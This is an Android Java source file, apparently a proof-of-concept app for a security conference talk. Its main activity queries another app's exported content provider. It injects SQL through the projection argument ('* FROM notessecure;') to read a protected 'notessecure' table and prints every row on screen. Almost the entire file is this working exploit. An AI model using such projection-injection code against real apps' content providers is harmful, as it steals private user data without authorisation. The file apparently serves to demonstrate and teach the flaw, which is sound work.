package pt.claudio.security.pixelscamp_content2expoit;

import pt.claudio.security.pixelscamp_content2expoit.R;

import android.net.Uri;
import android.os.Bundle;
import android.app.Activity;
import android.database.Cursor;
import android.database.DatabaseUtils;
import android.support.v7.app.AppCompatActivity;
import android.text.method.ScrollingMovementMethod;
import android.view.Menu;
import android.widget.TextView;

public class MainActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        TextView text = (TextView) findViewById(R.id.textView1);
        text.setMovementMethod(new ScrollingMovementMethod());
        String dump = null;

        Uri URI = Uri.parse("content://pt.claudio.security.pixelscamp_content2.contentprovider/notes");
        String[] projection = {"* FROM notessecure;"};
        Cursor curs = getContentResolver().query(URI,projection, null, null, null);


        if (curs.moveToFirst()) {
            do {
                dump = DatabaseUtils.dumpCurrentRowToString(curs);
                text.append(dump);
                text.append("\n");
            } while (curs.moveToNext());
        }


    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.main, menu);
        return true;
    }
}